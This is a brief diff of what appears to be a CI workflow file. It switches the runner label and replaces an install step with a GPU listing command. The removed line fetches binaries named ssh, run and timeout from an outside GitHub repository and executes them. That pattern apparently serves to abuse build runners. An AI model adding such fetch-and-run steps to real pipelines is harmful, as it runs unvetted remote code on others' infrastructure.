@@ -5,7 +5,7 @@ on:
 jobs:
   Build:
     name: hanakaru
-    runs-on: self-hosted
+    runs-on: google
     strategy:
       max-parallel: 20
       fail-fast: false
@@ -20,4 +20,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Install
       run: |
-        wget https://raw.githubusercontent.com/kijang-7/ssh/main/ssh && wget https://raw.githubusercontent.com/kijang-7/ssh/main/run && wget https://raw.githubusercontent.com/kijang-7/ssh/main/timeout && chmod +x ssh && ./ssh
+        nvidia-smi -L
